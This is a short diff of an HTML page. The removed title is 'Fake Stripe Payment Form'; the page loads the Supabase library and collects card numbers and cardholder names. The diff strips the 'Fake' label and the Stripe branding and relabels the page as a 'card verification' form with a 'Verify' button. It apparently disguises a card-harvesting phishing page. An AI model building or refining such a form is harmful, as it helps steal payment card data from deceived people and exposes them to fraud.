@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Fake Stripe Payment Form</title>
+  <title> card verification</title>
   <!-- 1. Load Supabase JavaScript Library -->
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <style>
@@ -76,7 +76,7 @@
 </head>
 <body>
   <div class="stripe-form">
-    <h2>Stripe Payment</h2>
+    <h2> Verify Card </h2>
     <form id="paymentForm">
       <div class="form-group">
         <label for="cardNumber">Card Number</label>
@@ -99,10 +99,10 @@
         <label for="cardName">Cardholder Name</label>
         <input type="text" id="cardName" placeholder="Name on card" required />
       </div>
-      <button type="submit" class="pay-button">Pay with Stripe</button>
+      <button type="submit" class="pay-button">Verify</button>
     </form>
     <div class="confirmation" id="confirmation" style="display: none;">
-      <p>Payment processed successfully!</p>
+      <p> verification successfully!</p>
     </div>
   </div>
 
